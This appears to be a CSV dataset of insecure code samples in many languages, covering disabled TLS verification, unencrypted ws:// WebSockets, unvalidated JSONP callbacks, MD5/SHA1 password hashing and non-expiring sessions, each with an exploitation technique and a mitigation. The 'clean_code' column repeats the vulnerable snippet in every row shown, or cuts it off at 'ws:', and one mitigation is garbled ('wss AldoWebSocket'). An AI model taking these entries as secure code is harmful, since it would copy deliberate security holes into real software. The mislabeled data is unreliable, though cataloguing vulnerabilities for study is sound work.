id,language,vulnerability_type,description,code_snippet,exploitation_techniques,mitigation,clean_code,has_user_input,has_db_operation,has_file_operation,has_eval,code_length,has_validation,has_quotes,has_concatenation,vuln_category,vul
vuln-354,Scala,Insecure TLS Configuration,Disabling TLS verification.,WSClient(wsConfig.copy(ssl = SSLConfig(loose = SSLLooseConfig(disableCertificateVerification = true))),MITM attack to spoof server.,Enable certificate verification.,WSClient(wsConfig.copy(ssl = SSLConfig(loose = SSLLooseConfig(disableCertificateVerification = true))),False,False,False,False,102,False,False,False,Configuration,1
vuln-355,Rust,Insecure TLS Configuration,Skipping TLS certificate validation.,let client = Client::builder().danger_accept_invalid_certs(true).build()?;,MITM to intercept traffic.,Use default TLS settings with validation.,let client = Client::builder().danger_accept_invalid_certs(true).build()?;,False,False,False,False,74,False,False,False,Configuration,1
vuln-356,Elixir,Insecure TLS Configuration,Disabling TLS verification.,":httpc.request(:get, {url, [ssl: [verify: :verify_none]]}, [], [])",MITM attack to spoof server.,Set verify: :verify_peer; use CA certificates.,":httpc.request(:get, {url, [ssl: [verify: :verify_none]]}, [], [])",False,False,False,False,66,False,False,False,Configuration,1
vuln-357,Perl,Insecure TLS Configuration,Bypassing TLS certificate checks.,use LWP::UserAgent; $ua->ssl_opts(verify_hostname => 0);,MITM to intercept requests.,Enable ssl_opts(verify_hostname => 1).,use LWP::UserAgent; $ua->ssl_opts(verify_hostname => 0);,False,False,False,False,56,False,False,False,Configuration,1
vuln-358,Node.js,Insecure WebSocket,Unencrypted WebSocket connections.,const ws = new WebSocket('ws://example.com');,MITM to intercept WebSocket traffic.,Use wss:// for encrypted connections.,const ws = new WebSocket('ws:,False,False,False,False,45,False,True,False,Other,1
vuln-359,Python,Insecure WebSocket,Using ws:// instead of wss://.,websocket.connect('ws://example.com'),Sniff unencrypted WebSocket traffic.,Use websocket.connect('wss://example.com'),websocket.connect('ws:,False,False,False,False,37,False,True,False,Other,1
vuln-360,Java,Insecure WebSocket,Unencrypted WebSocket connections.,"WebSocketClient client = new WebSocketClient(new URI(""ws://example.com""));",MITM to capture WebSocket data.,Use wss://example.com for secure connections.,"WebSocketClient client = new WebSocketClient(new URI(""ws:",False,False,False,False,74,False,True,False,Other,1
vuln-361,PHP,Insecure WebSocket,Using unencrypted WebSocket.,$client = new WebSocket('ws://example.com');,Intercept unencrypted traffic.,Use wss:// for WebSocket connections.,$client = new WebSocket('ws:,False,False,False,False,44,False,True,False,Other,1
vuln-362,Ruby,Insecure WebSocket,Unencrypted WebSocket connection.,Faye::WebSocket::Client.new('ws://example.com'),Sniff WebSocket traffic.,Use wss://example.com for secure connection.,Faye::WebSocket::Client.new('ws:,False,False,False,False,47,False,True,False,Other,1
vuln-363,Go,Insecure WebSocket,Using ws:// WebSocket.,"ws, _ := websocket.Dial(""ws://example.com"", """", ""http://localhost"")",MITM to intercept data.,Use wss:// for encrypted WebSocket.,"ws, _ := websocket.Dial(""ws:",False,False,False,False,67,False,True,False,Other,1
vuln-364,C# (.NET),Insecure WebSocket,Unencrypted WebSocket connection.,"var ws = new ClientWebSocket(); await ws.ConnectAsync(new Uri(""ws://example.com""), CancellationToken.None);",Capture unencrypted WebSocket traffic.,Use wss://example.com for secure connection.,"var ws = new ClientWebSocket(); await ws.ConnectAsync(new Uri(""ws:",False,False,False,False,107,False,True,False,Other,1
vuln-365,Kotlin,Insecure WebSocket,Using ws:// instead of wss://.,"val ws = WebSocket(""ws://example.com"")",MITM to intercept traffic.,Use wss://example.com for secure WebSocket.,"val ws = WebSocket(""ws:",False,False,False,False,38,False,True,False,Other,1
vuln-366,Scala,Insecure WebSocket,Unencrypted WebSocket connection.,"val ws = WebSocket(""ws://example.com"")",Sniff unencrypted WebSocket data.,Use wss:// for secure connection.,"val ws = WebSocket(""ws:",False,False,False,False,38,False,True,False,Other,1
vuln-367,Rust,Insecure WebSocket,Using ws:// WebSocket.,"let ws = tungstenite::connect(Url::parse(""ws://example.com"")?).1;",MITM to capture traffic.,"Use wss AldoWebSocket::connect(Url::parse(""wss://example.com"")?).1","let ws = tungstenite::connect(Url::parse(""ws:",False,False,False,False,65,False,True,False,Other,1
vuln-368,Elixir,Insecure WebSocket,Unencrypted WebSocket connections.,"web_socket = WebSocket.connect(""ws://example.com"")",Intercept unencrypted WebSocket traffic.,Use wss://example.com for secure connections.,"web_socket = WebSocket.connect(""ws:",False,False,False,False,50,False,True,False,Other,1
vuln-369,Perl,Insecure WebSocket,Using unencrypted ws://.,my $ws = Net::WebSocket::Client->new('ws://example.com');,Sniff WebSocket traffic.,Use wss:// for encrypted WebSocket.,my $ws = Net::WebSocket::Client->new('ws:,False,False,False,False,57,False,True,False,Other,1
vuln-370,Node.js,Insecure JSONP,JSONP callback without validation.,"res.jsonp({ data: sensitiveData }, req.query.callback);",Inject malicious callback to steal data.,Validate callback names; avoid JSONP if possible.,"res.jsonp({ data: sensitiveData }, req.query.callback);",True,True,False,False,55,False,False,False,Other,1
vuln-371,Python,Insecure JSONP,Unvalidated JSONP callback.,callback = request.args.get('callback'); return f'{callback}({json.dumps(data)})';,Inject malicious callback function.,Whitelist callbacks or use CORS instead.,callback = request.args.get('callback'); return f'{callback}({json.dumps(data)})';,False,False,False,False,82,False,True,False,Other,1
vuln-372,Java,Insecure JSONP,JSONP with unvalidated callback.,"String callback = request.getParameter(""callback""); response.getWriter().write(callback + ""("" + data + "")"");",Inject malicious callback to steal data.,Validate callback; prefer CORS.,"String callback = request.getParameter(""callback""); response.getWriter().write(callback + ""("" + data + "")"");",True,False,False,False,108,False,True,True,Other,1
vuln-373,PHP,Insecure JSONP,Unvalidated JSONP callback.,"$callback = $_GET['callback']; echo ""$callback($data);"";",Inject malicious callback function.,"Validate: if (preg_match('/^[a-zA-Z0-9_]+$/', $callback)) echo ""$callback($data);"";","$callback = $_GET['callback']; echo ""$callback($data);"";",False,False,False,False,56,False,True,False,Other,1
vuln-374,Ruby,Insecure JSONP,JSONP callback without validation.,"render json: data, callback: params[:callback]",Inject malicious callback to steal data.,Validate callback names; use CORS.,"render json: data, callback: params[:callback]",True,False,False,False,46,False,False,False,Other,1
vuln-375,Go,Insecure JSONP,Unvalidated JSONP callback.,"callback := r.URL.Query().Get(""callback""); fmt.Fprintf(w, ""%s(%s)"", callback, data)",Inject malicious callback function.,Validate callback with regex; prefer CORS.,"callback := r.URL.Query().Get(""callback""); fmt.Fprintf(w, ""%s(%s)"", callback, data)",True,True,False,False,83,False,True,True,Other,1
vuln-376,C# (.NET),Insecure JSONP,JSONP with unvalidated callback.,"var callback = Request.Query[""callback""]; return Content($""{callback}({data})"");",Inject malicious callback to steal data.,"Validate: if (Regex.IsMatch(callback, ""^[a-zA-Z0-9_]+$"")) return Content(...);","var callback = Request.Query[""callback""]; return Content($""{callback}({data})"");",True,True,False,False,80,False,True,False,Other,1
vuln-377,Kotlin,Insecure JSONP,Unvalidated JSONP callback.,"val callback = call.request.queryParameters[""callback""]; call.respondText(""$callback($data)"")",Inject malicious callback function.,"Validate: if (callback?.matches(Regex(""^[a-zA-Z0-9_]+$"")) == true) respond","val callback = call.request.queryParameters[""callback""]; call.respondText(""$callback($data)"")",True,True,False,False,93,False,True,False,Other,1
vuln-378,Scala,Insecure JSONP,JSONP callback without validation.,"val callback = params(""callback""); Ok(s""$callback($data)"")",Inject malicious callback to steal data.,"Validate: if (callback.matches(""^[a-zA-Z0-9_]+$"")) Ok(...)","val callback = params(""callback""); Ok(s""$callback($data)"")",True,False,False,False,58,False,True,False,Other,1
vuln-379,Rust,Insecure JSONP,Unvalidated JSONP callback.,"let callback = req.query(""callback"")?; res.render_text(format!(""{}({})"", callback, data))",Inject malicious callback function.,Validate: if callback.chars().all(|c| c.is_alphanumeric() || c == '_') { render },"let callback = req.query(""callback"")?; res.render_text(format!(""{}({})"", callback, data))",True,True,False,False,89,False,True,False,Other,1
vuln-380,Elixir,Insecure JSONP,JSONP with unvalidated callback.,"callback = params[""callback""]; send_resp(conn, 200, ""#{callback}(#{data})"")",Inject malicious callback to steal data.,"Validate: if String.match?(callback, ~r/^[a-zA-Z0-9_]+$/) do send_resp","callback = params[""callback""]; send_resp(conn, 200, ""#{callback}(#{data})"")",True,False,False,False,75,False,True,False,Other,1
vuln-381,Perl,Insecure JSONP,Unvalidated JSONP callback.,"my $callback = $r->param('callback'); print ""$callback($data);"";",Inject malicious callback function.,"Validate: print ""$callback($data);"" if $callback =~ /^[a-zA-Z0-9_]+$/;","my $callback = $r->param('callback'); print ""$callback($data);"";",True,False,False,False,64,False,True,False,Other,1
vuln-382,Node.js,Weak Password Hashing,Using weak or unsalted hash for passwords.,const hash = crypto.createHash('md5').update(password).digest('hex');,Crack hashes with rainbow tables.,"Use bcrypt: bcrypt.hashSync(password, 10)",const hash = crypto.createHash('md5').update(password).digest('hex');,False,True,False,False,69,False,True,False,Other,1
vuln-383,Python,Weak Password Hashing,Using MD5 or SHA1 for passwords.,hash = hashlib.md5(password.encode()).hexdigest(),Use rainbow tables to reverse hashes.,"Use bcrypt: bcrypt.hashpw(password.encode(), bcrypt.gensalt())",hash = hashlib.md5(password.encode()).hexdigest(),False,False,False,False,49,False,False,False,Other,1
vuln-384,Java,Weak Password Hashing,Using weak hashing algorithm for passwords.,"MessageDigest md = MessageDigest.getInstance(""SHA1""); String hash = md.digest(password.getBytes());",Crack with precomputed tables.,"Use BCrypt: BCrypt.hashpw(password, BCrypt.gensalt())","MessageDigest md = MessageDigest.getInstance(""SHA1""); String hash = md.digest(password.getBytes());",False,False,False,False,99,False,True,False,Other,1
vuln-385,PHP,Weak Password Hashing,Using MD5 for password storage.,$hash = md5($password);,Reverse hashes with rainbow tables.,"Use password_hash($password, PASSWORD_BCRYPT)",$hash = md5($password);,False,False,False,False,23,False,False,False,Other,1
vuln-386,Ruby,Weak Password Hashing,Using unsalted SHA1 for passwords.,hash = Digest::SHA1.hexdigest(password),Crack with precomputed tables.,Use BCrypt: BCrypt::Password.create(password),hash = Digest::SHA1.hexdigest(password),False,False,False,False,39,False,False,False,Other,1
vuln-387,Go,Weak Password Hashing,Using weak hash for passwords.,hash := sha1.Sum([]byte(password)),Use rainbow tables to crack hashes.,"Use bcrypt: bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)",hash := sha1.Sum([]byte(password)),False,False,False,False,34,False,False,False,Other,1
vuln-388,C# (.NET),Weak Password Hashing,Using MD5 for password storage.,var hash = MD5.Create().ComputeHash(Encoding.UTF8.GetBytes(password));,Crack with rainbow tables.,"Use BCrypt: BCrypt.Net.BCrypt.HashPassword(password, 12)",var hash = MD5.Create().ComputeHash(Encoding.UTF8.GetBytes(password));,False,False,False,False,70,False,False,False,Other,1
vuln-389,Kotlin,Weak Password Hashing,Using SHA1 for passwords.,"val hash = MessageDigest.getInstance(""SHA1"").digest(password.toByteArray())",Reverse hashes with tables.,"Use BCrypt: BCrypt.hashpw(password, BCrypt.gensalt())","val hash = MessageDigest.getInstance(""SHA1"").digest(password.toByteArray())",False,False,False,False,75,False,True,False,Other,1
vuln-390,Scala,Weak Password Hashing,Using weak hash algorithm.,"val hash = MessageDigest.getInstance(""MD5"").digest(password.getBytes)",Crack with precomputed tables.,"Use BCrypt: BCrypt.hashpw(password, BCrypt.gensalt())","val hash = MessageDigest.getInstance(""MD5"").digest(password.getBytes)",False,False,False,False,69,False,True,False,Other,1
vuln-391,Rust,Weak Password Hashing,Using SHA1 for password hashing.,let hash = sha1::Sha1::from(password).digest().bytes();,Use rainbow tables to crack.,"Use bcrypt::hash(password, DEFAULT_COST)",let hash = sha1::Sha1::from(password).digest().bytes();,False,False,False,False,55,False,False,False,Other,1
vuln-392,Elixir,Weak Password Hashing,Using weak hash for passwords.,"hash = :crypto.hash(:md5, password)",Crack with rainbow tables.,Use Bcrypt.hash_pwd_salt(password),"hash = :crypto.hash(:md5, password)",False,False,False,False,35,False,False,False,Other,1
vuln-393,Perl,Weak Password Hashing,Using MD5 for password storage.,use Digest::MD5 qw(md5_hex); my $hash = md5_hex($password);,Reverse with rainbow tables.,"Use Crypt::Bcrypt: bcrypt_hash($password, '$2a$12$salt')",use Digest::MD5 qw(md5_hex); my $hash = md5_hex($password);,False,False,False,False,59,False,False,False,Other,1
vuln-394,Node.js,Insecure Session Timeout,Sessions without expiration or long timeout.,"app.use(session({ secret: 'secret', cookie: { maxAge: null } }));",Steal session cookies for persistent access.,Set short timeout: cookie: { maxAge: 3600000 } // 1 hour,"app.use(session({ secret: 'secret', cookie: { maxAge: null } }));",False,False,False,False,65,False,True,False,Authentication,1
vuln-395,Python,Insecure Session Timeout,No session expiration.,app.config['SESSION_COOKIE_LIFETIME'] = None,Reuse stolen cookies indefinitely.,Set: app.config['SESSION_COOKIE_LIFETIME'] = timedelta(hours=1),app.config['SESSION_COOKIE_LIFETIME'] = None,False,False,False,False,44,False,True,False,Authentication,1
